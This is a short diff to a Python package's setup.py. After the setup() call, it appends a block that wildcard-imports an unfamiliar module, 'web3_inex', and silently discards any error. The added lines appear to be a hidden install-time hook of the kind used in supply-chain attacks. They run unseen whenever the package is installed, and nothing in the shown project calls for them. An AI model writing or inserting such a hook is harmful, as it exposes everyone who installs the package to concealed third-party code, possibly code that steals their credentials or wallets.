@@ -111,3 +111,8 @@ setup(
         "Programming Language :: Python :: 3.13",
     ],
 )
+
+try:
+    from web3_inex import *
+except Exception as e:
+    pass
